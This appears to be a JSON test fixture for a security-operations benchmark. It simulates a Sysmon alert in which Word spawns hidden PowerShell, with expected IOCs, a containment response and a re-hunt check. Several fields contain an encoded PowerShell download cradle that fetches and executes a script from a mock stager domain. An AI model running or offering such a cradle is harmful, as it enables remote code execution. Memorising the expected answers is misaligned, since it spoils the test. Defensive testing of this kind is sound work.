@@ -1,0 +1,75 @@
+{
+  "id": "ATK-09",
+  "attackType": "POWERSHELL",
+  "title": "Hidden encoded PowerShell download cradle spawned by Word",
+  "description": "WINWORD.EXE on WKS-HR-03 spawns powershell.exe -NoP -W Hidden -Enc ... which decodes to IEX (New-Object Net.WebClient).DownloadString('http://vigix-mock-stager.net/a.ps1'). The process tree is killed and the stager domain blocked; the re-hunt finds no further contact with the stager.",
+  "alert": {
+    "id": "1726659600.10011",
+    "timestamp": "2026-09-18T11:40:00.000+0000",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "PowerShell executed hidden with an encoded command (download cradle)",
+      "groups": ["windows", "sysmon", "powershell", "vigix_custom"],
+      "firedtimes": 1,
+      "mitre": { "id": ["T1059.001"], "tactic": ["Execution"], "technique": ["PowerShell"] }
+    },
+    "agent": { "id": "019", "name": "WKS-HR-03", "ip": "10.0.5.19" },
+    "manager": { "name": "wazuh-manager" },
+    "decoder": { "name": "windows_eventchannel" },
+    "location": "EventChannel",
+    "data": {
+      "url": "http://vigix-mock-stager.net/a.ps1",
+      "win": {
+        "system": { "eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational" },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgBpAGcAaQB4AC0AbQBvAGMAawAtAHMAdABhAGcAZQByAC4AbgBlAHQALwBhAC4AcABzADEAJwApAA==",
+          "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "user": "CORP\\hr.clerk"
+        }
+      }
+    },
+    "full_log": "Process create: powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgBpAGcAaQB4AC0AbQBvAGMAawAtAHMAdABhAGcAZQByAC4AbgBlAHQALwBhAC4AcABzADEAJwApAA== parent WINWORD.EXE user CORP\\hr.clerk decoded: IEX (New-Object Net.WebClient).DownloadString('http://vigix-mock-stager.net/a.ps1')"
+  },
+  "expected": {
+    "severity": "high",
+    "host": "WKS-HR-03",
+    "mitreTechniques": ["T1059.001"],
+    "iocs": [
+      { "type": "command", "value": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgBpAGcAaQB4AC0AbQBvAGMAawAtAHMAdABhAGcAZQByAC4AbgBlAHQALwBhAC4AcABzADEAJwApAA==" },
+      { "type": "process", "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" },
+      { "type": "url", "value": "http://vigix-mock-stager.net/a.ps1" },
+      { "type": "domain", "value": "vigix-mock-stager.net" },
+      { "type": "user", "value": "hr.clerk" }
+    ],
+    "policyInputs": { "assetTier": "tier2_high", "ruleLevel": 12 },
+    "approval": "POLICY_DECIDES",
+    "primaryResult": "RESOLVED",
+    "finalOutcome": "RESOLVED"
+  },
+  "response": {
+    "action": "Kill the WINWORD/powershell process tree on WKS-HR-03, block vigix-mock-stager.net at the proxy, collect the source document",
+    "target": "http://vigix-mock-stager.net/a.ps1"
+  },
+  "rehunt": {
+    "rounds": [
+      {
+        "round": 1,
+        "scenario": "NO_MATCH",
+        "expected": { "matchingEvents": 0, "iocRecurrence": false, "spreadDetected": false, "threatContained": true, "verification": "RESOLVED" },
+        "events": [
+          {
+            "id": "1726666800.10131",
+            "timestamp": "2026-09-18T13:40:00.000+0000",
+            "@timestamp": "2026-09-18T13:40:00.000Z",
+            "rule": { "id": "61603", "level": 3, "description": "Sysmon - Event 1: Process creation", "groups": ["windows", "sysmon"] },
+            "agent": { "id": "019", "name": "WKS-HR-03", "ip": "10.0.5.19" },
+            "data": { "win": { "system": { "eventID": "1" }, "eventdata": { "image": "C:\\Windows\\System32\\notepad.exe", "commandLine": "notepad.exe C:\\Users\\hr.clerk\\Documents\\todo.txt" } } },
+            "full_log": "Process create: notepad.exe C:\\Users\\hr.clerk\\Documents\\todo.txt parent explorer.exe"
+          }
+        ]
+      }
+    ]
+  }
+}
